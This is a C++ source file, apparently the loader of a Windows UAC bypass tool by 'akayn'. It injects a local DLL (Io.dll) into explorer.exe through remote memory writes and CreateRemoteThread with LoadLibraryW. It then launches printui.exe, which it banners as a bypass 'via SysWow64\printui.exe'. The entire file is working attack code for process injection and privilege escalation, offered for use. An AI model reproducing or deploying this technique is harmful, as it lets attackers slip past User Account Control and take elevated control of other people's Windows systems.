
#include "stdafx.h"

DWORD 
GetProcessByName(
	_In_ const wchar_t* hProc
)
{
	HANDLE handle;
	PROCESSENTRY32 pEntry;
	handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	pEntry.dwSize = sizeof(PROCESSENTRY32);

	do {
		if (!_wcsicmp(pEntry.szExeFile, hProc)) {
			DWORD luid = pEntry.th32ProcessID;
			CloseHandle(handle);
			return luid;
		}
	} while (Process32Next(handle,&pEntry));
	return 0;
}

DWORD _CreateRemoteThreadW(
	PCWSTR dll,
	DWORD luid
)
{
	DWORD dwSize = (lstrlenW(dll) + 1) * sizeof(wchar_t);
	HANDLE hProcess = OpenProcess(
		PROCESS_QUERY_INFORMATION |
		PROCESS_CREATE_THREAD |
		PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE,
		FALSE, luid
	);
	LPVOID pszLibFileRemote = (PWSTR)
		VirtualAllocEx(
			hProcess,
			NULL,
			dwSize,
			MEM_COMMIT, PAGE_READWRITE
		);
	DWORD n = WriteProcessMemory(
		hProcess,
		pszLibFileRemote,
		(PVOID)dll,
		dwSize,
		NULL
	);
	PTHREAD_START_ROUTINE pfnThreadRtn = (
		PTHREAD_START_ROUTINE)GetProcAddress(
			GetModuleHandle(TEXT("Kernel32")),
			"LoadLibraryW"
		);
	HANDLE hThread = CreateRemoteThread(
		hProcess,
		NULL,
		0,
		pfnThreadRtn,
		pszLibFileRemote,
		0,
		NULL
	);
	WaitForSingleObject(hThread, INFINITE);
	if (pszLibFileRemote != NULL)
		VirtualFreeEx(hProcess, pszLibFileRemote, 0, MEM_RELEASE);
	if (hThread != NULL)
		CloseHandle(hThread);
	if (hProcess != NULL)
		CloseHandle(hProcess);

	return(0);
}

VOID 
main(
	_In_ VOID
)
{
	DWORD luid = NULL;
	TCHAR lPath[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, lPath);
	lstrcat(lPath, L"\\Io.dll");
	luid = GetProcessByName(
		L"explorer.exe"
	);
	if (luid == 0) {
#ifdef DEBUG
		cout << GetLastError();
#endif
	}
	auto Ret = _CreateRemoteThreadW(
		lPath,
		luid
	);

	
#ifdef DEBUG
	cout << GetLastError() << endl << Ret << endl;
	
#endif
	cout << "     __     ___     __    " << endl;
	cout << "    / /    /   |   / /    " << endl;
	cout << "   / /_   |    |  / /_    " << endl;
	cout << "  /_ _/   |___/  /___/    " << endl << endl << endl;
	cout << " yet another uacbypass!!!     " << endl << endl;
	cout << " Via SysWow64\\printui.exe!!!!     " << endl;
	cout << " by akayn     " << endl;
	
	
	// if you compile with x64 leave this line
	// other-wise un-mark the second one...
	HANDLE printUi = ShellExecute(
		NULL, NULL, L"C:\\Windows\\Sysnative\\printui.exe", NULL, NULL, SW_SHOW
	);
	//HANDLE printU = ShellExecute(
	//	NULL, NULL, L"C:\\Windows\\SysWow64\\\printui.exe", NULL, NULL, SW_SHOW
	//);
	int y;
	cin >> y;
}

